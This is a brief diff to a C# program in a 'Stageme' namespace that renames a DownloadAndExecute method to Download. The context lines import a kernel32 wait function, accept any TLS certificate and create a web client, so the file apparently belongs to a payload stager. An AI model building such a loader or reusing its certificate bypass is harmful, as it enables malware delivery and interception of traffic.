@@ -17,7 +17,7 @@ namespace Stageme
         [DllImport("kernel32.dll")]
         static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
 
-        public static void DownloadAndExecute()
+        public static void Download()
         {
             ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
             System.Net.WebClient client = new System.Net.WebClient();
@@ -31,7 +31,7 @@ namespace Stageme
 
         public static void Main(String[] args)
         {
-            DownloadAndExecute();
+            Download();
         }
     }
 }
